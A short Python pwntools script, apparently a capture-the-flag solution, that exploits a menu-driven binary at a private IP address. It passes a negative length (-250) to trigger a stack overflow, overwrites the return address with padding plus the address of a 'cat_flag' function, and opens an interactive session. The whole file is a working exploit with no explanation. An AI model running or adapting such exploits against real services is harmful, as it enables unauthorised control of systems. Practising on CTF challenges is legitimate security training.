from pwn import * 
from pwn import p32

debug = False

if debug:
    p=process("E:\Study_code\Study_Sagiring\Py_small_program\My_pwn\pwn")
else :
    p=remote("10.21.162.184",6657)
    # elf =ELF("E:\Study_code\Study_Sagiring\Py_small_program\My_pwn\pwn")
    # libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    
def god_get(payload):

    # print (p.recv())

    v6 = b'1'
    for i in range(0,256*2):
        p.sendlineafter("Choice: >",v6)

    v6 = b'0';
    p.sendlineafter("Choice: >",v6)
# step1 get!

    v6 = b'5';
    p.sendlineafter("Choice: >",v6)
    p.sendlineafter("Your skill name length: ",b'-250')
    # p.sendline(payload)
    p.sendline(payload)

    p.interactive()#交互shell
    

cat_flag = 0x0804984A 
offset = 0x47+0x4
payload = b'a'*offset+ p32(cat_flag)
god_get(payload)

# print (p.recvall())
